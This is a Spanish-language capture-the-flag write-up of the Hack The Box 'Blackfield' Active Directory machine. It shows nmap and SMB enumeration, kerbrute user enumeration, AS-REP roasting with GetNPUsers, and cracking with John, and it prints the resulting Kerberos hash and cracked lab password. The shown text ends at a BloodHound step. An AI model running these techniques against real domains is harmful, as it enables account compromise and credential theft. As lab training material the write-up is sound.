# Machine Blackfield

## Skills

```
SMB Enumeration
Kerberos User Enumeration (Kerbrute)
ASRepRoast Attack (GetNPUsers)
Bloodhound Enumeration
Abusing ForceChangePassword Privilege (net rpc)
Lsass Dump Analysis (Pypykatz)
Abusing WinRM
SeBackupPrivilege Exploitation
DiskShadow
Robocopy Usage
NTDS Credentials Extraction (secretsdump)

```

### Se realiza escaneo de puertos 

```
│ # Nmap 7.94SVN scan initiated Sat Jun 29 22:33:18 2024 as: nmap -sCV -p53,88,135,389,445,593,3268,5985 -oN target 10.10.10.192
   2   │ Nmap scan report for 10.10.10.192
   3   │ Host is up (0.18s latency).
   4   │
   5   │ PORT     STATE SERVICE       VERSION
   6   │ 53/tcp   open  domain        Simple DNS Plus
   7   │ 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-30 09:33:27Z)
   8   │ 135/tcp  open  msrpc         Microsoft Windows RPC
   9   │ 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
  10   │ 445/tcp  open  microsoft-ds?
  11   │ 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  12   │ 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
  13   │ 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  14   │ |_http-title: Not Found
  15   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  16   │ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
  17   │
  18   │ Host script results:
  19   │ |_clock-skew: 7h00m01s
  20   │ | smb2-security-mode:
  21   │ |   3:1:1:
  22   │ |_    Message signing enabled and required
  23   │ | smb2-time:
  24   │ |   date: 2024-06-30T09:33:40
  25   │ |_  start_date: N/A
  26   │
  27   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  28   │ # Nmap done at Sat Jun 29 22:34:19 2024 -- 1 IP address (1 host up) scanned in 61.33 seconds

```

### Puertos importantes SMB, ldp y winrm

### analice el protocolo smb para ver si podia ver algo

### Se realiza validacion con smbclient y con smbmap y se observa que tenemos acceso al recurso de profiles


```
└─# smbmap -H 10.10.10.192 -u "prueba"


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                NO ACCESS        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                NO ACCESS        Logon server share 
        profiles$                                               READ ONLY        
        SYSVOL                                                  NO ACCESS        Logon server share 

```

### consultamos el recurso y nos arroja un listado grande de usuarios, * no los puse todos debido a que son muchos

```
└─# smbmap -H 10.10.10.192 -u "prueba" -r "profiles$"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                NO ACCESS        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                NO ACCESS        Logon server share
        profiles$                                               READ ONLY
        ./profiles$
        dr--r--r--                0 Wed Jun  3 12:47:12 2020    .
        dr--r--r--                0 Wed Jun  3 12:47:12 2020    ..
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AAlleni
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABarteski
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABekesz
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABenzies
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABiemiller
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AChampken
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ACheretei
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ACsonaki
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AHigchens
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AJaquemai
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKlado
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKoffenburger
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKollolli
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKruppe
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKubale
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ALamerz
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AMaceldon
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AMasalunga
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ANavay
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ANesterova
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ANeusse
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AOkleshen
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    APustulka
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ARotella
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ASanwardeker
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AShadaia
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ASischo
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ASpruce
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ATakach
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ATaueg
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ATwardowski
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    audit2020
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AWangenheim
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AWorsey
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AZigmunt
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    BBakajza

```

### Extraemos los usuarios de la siguiente forma

`└─# smbmap -H 10.10.10.192 -u "prueba" -r "profiles$" | awk 'NF{print $NF}' > ../content/users`

### Teniendo los usuarios ya podemos hacer una enumeracion con kerbrute

```
Kerbrute apunta principalmente al puerto 88/TCP, que es el puerto estándar utilizado por el servicio de autenticación Kerberos. Este es el puerto en el que los servidores Kerberos escuchan solicitudes de autenticación.
```

```
└─# kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local ./users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 07/04/24 - Ronnie Flathers @ropnop

2024/07/04 22:42:45 >  Using KDC(s):
2024/07/04 22:42:45 >   10.10.10.192:88

2024/07/04 22:43:18 >  [+] VALID USERNAME:   audit2020@BLACKFIELD.local

2024/07/04 22:45:22 >  [+] VALID USERNAME:   svc_backup@BLACKFIELD.local
2024/07/04 22:45:22 >  [+] VALID USERNAME:   support@BLACKFIELD.local
2024/07/04 22:45:49 >  Done! Tested 339 usernames (3 valid) in 183.218 seconds

```

### Teniendo los usuarios validos apartir del listado podemos usar la herramienta de impacket para solicitar a los usurios los TGTs que son vulnerables a ASREPRoast 

```
ASREPRoast es una técnica de ataque contra Active Directory (AD) que explota la configuración de Kerberos en la que algunos usuarios tienen deshabilitada la preautenticación. Este ataque permite a los atacantes obtener hashes de contraseñas cifradas, que luego pueden ser utilizados en ataques de fuerza bruta offline para intentar descifrar las contraseñas de los usuarios.

```
```
GetNPUsers.py blackfield.local/ -no-pass -usersfile validuser
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:51a11dd4d2d236f6a335b94a678795ff$2d6bdc38c9a40f5df3110b45ab231a880dc4daf5feeaaec74861c4f904756a56106f1ec01c3221871b0d30ee9894f20baaab2028944a82e8b53cd3d82b7f6c0a8d9ebaf45748e7cd24036ea86f6278ce0c233547fd52fe21819621f78346200a9601cfc89cad6b412ff2f0594e50e0438c37cf7dc81485434d17adfd7251a91bd853404edae44eb1e604273e5e1513f4d13b878b91a034491bcfa53484139b090471af757f37101fe71e30e9cfae02b48a1f5645eb8c15c27ebcaf395bd84c51bd294991c002e6acd7b2bcaf884db6cc2f80f330af1ec9ac05158159e5e91683ccaa1f1dec006b47cff1971cd27d0a9180bb7715
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

```
### como obtuvimos el hash podemos utilizar john de ripper para crakear la contraseña, se guarda el hash en un archivo.

```└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:14 DONE (2024-07-05 00:40) 0.06939g/s 994793p/s 994793c/s 994793C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### con esto ya podemos hacer pruebas de smb,crackmapexec, sin embargo de las prueba sin embargo no se encontro mucho y no se pownea

```
└─# smbmap -H 10.10.10.192 -u "support" -p "#00^BlackKnight"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                NO ACCESS        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY        Logon server share

┌──(root㉿kali)-[/home/…/Documents/htb/blackfield/content]
└─# crackmapexec smb 10.10.10.192 -u "support" -p "#00^BlackKnight"
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

### Con la ayuda de ldapdomanindump podemos visualiar de manera grafica en html la estructura del AD.

```
nnecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/htb/blackfield/content/mapeo]
└─# ls                                                                            
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

```

### Con la ayuda de bloodhound se pudo observar que hay un usuario al que se le puede cambiar la contraseña. 


